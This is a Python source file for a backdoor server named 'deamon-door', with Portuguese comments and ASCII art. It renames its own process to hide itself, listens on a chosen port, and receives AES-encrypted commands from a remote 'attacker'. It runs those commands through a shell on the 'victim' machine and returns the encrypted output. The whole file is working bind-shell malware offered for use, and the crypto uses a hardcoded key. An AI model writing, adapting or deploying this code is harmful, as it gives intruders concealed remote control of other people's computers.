#!/usr/bin/python

from Crypto.Cipher import AES
from Crypto import Random
import socket
import base64
import os
import subprocess
import optparse
import sys
import setproctitle

#criador darkcode
#server main
version = "0.2"
dsa = ('''

X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X
|                           ,,'``````````````',,                            |
X                        ,'`                   `',                          X
|                      ,' Encryption:AES/BASE16   ',                        |
X                    ,'          ;       ;          ',                      X
|       (           ;             ;     ;             ;     (               |
X        )         ;              ;     ;              ;     )              X
|       (         ;                ;   ;                ;   (               |
X        )    ;   ;    ,,'```',,,   ; ;   ,,,'```',,    ;   ;               X
|       (    ; ',;   '`          `',   ,'`          `'   ;,' ;              |
X        )  ; ;`,`',  _--~~~~--__   ' '   __--~~~~--_  ,'`,'; ;     )       X
|       (    ; `,' ; :  /       \~~-___-~~/       \  : ; ',' ;     (        |
X  )     )   )',  ;   -_\  o    /  '   '  \    o  /_-   ;  ,'       )   (   X
| (     (   (   `;      ~-____--~'       '~--____-~      ;'  )     (     )  |
X  )     )   )   ;            ,`;,,,   ,,,;',            ;  (       )   (   X
| (     (   (  .  ;        ,'`  (__ '_' __)  `',        ;  . )     (     )  |
X  )     \/ ,".). ';    ,'`        ~~ ~~        `',    ;  .(.", \/  )   (   X
| (   , ,'|// / (/ ,;  '        _--~~-~~--_        '  ;, \)    \|', ,    )  |
X ,)  , \/ \|  \\,/  ;;       ,; |_| | |_| ;,       ;;  \,//  |/ \/ ,   ,   X
|",   .| \_ |\/ |#\_/;       ;_| : `~'~' : |_;       ;\_/#| \/| _/ |.   ,"  |
X#(,'  )  \\\#\ \##/)#;     :  `\/       \/   :     ;#(\##/ /#///  (  ',)# ,X
|| ) | \ |/ /#/ |#( \; ;     :  deamon-door  ;     ; ;/ )#| \#\ \| / | ( |) |
X\ |.\\ |\_/#| /#),,`   ;     ;./\_     _/\.;     ;   `,,(#\ |#\_/| //.| / ,X
| \\_/# |#\##/,,'`       ;     ~~--|~|~|--~~     ;       `',,\##/#| #\_// \/|
X  ##/#  #,,'`            ;        ~~~~~        ;            `',,#  #\##  //X
|####@,,'`                 `',               ,'`                 `',,@####| |
X#,,'`                        `',         ,'`                        `',,###X
|'                               ~~-----~~                               `' |
X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X-X
''')
title = raw_input('coloque o nome do prcesso: ')
print("o sua backdoor esta rodando com o nome :%s" %title)

setproctitle.setproctitle(title)

EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# Chave secreta aleatoria (tanto o cliente como o servidor devem corresponder a esta chave)
secret = "darkcodedarkcode"
iv = Random.new().read(AES.block_size)

# criando o ob cipher
cipher = AES.new(secret, AES.MODE_CFB, iv)

# Parse argumento da linha de comando
# Geralmente qualquer saida seria escondida no lado do servidor (vitima)
parser = optparse.OptionParser("sintaxe: python3 server.py -p <port>")
parser.add_option('-p', dest='port', type = 'int', help = 'port')
(options, args) = parser.parse_args()
if (options.port == None):
	print parser.usage
	sys.exit()
else:
	port = options.port

# listando clientes
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', port))
print(dsa)
print(version)
print("host:0.0.0.0:%d" % port)
c.listen(10)
try:
	s, a = c.accept()
	print(a)
	s.send(EncodeAES(cipher, 'voce esta conectado' + secret))
except KeyboardInterrupt:
	print "saida "
while True:
	try:
		data = s.recv(1024)
		print("comando de: %d",a)
		print(data)
		print("----------")
	# decrypt data
		decrypted = DecodeAES(cipher, data)
	
	#Verifique se ha "saida" pelo atacante
		if decrypted == "saida":
			break    	

	# execute command
		proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdoutput = proc.stdout.read() + proc.stderr.read() + secret

	# criptografar saida
		encrypted = EncodeAES(cipher, stdoutput)

	# enviar saida criptografada
		s.send(encrypted)
	except KeyboardInterrupt:
		print("dsa")
s.close()
sys.exit()
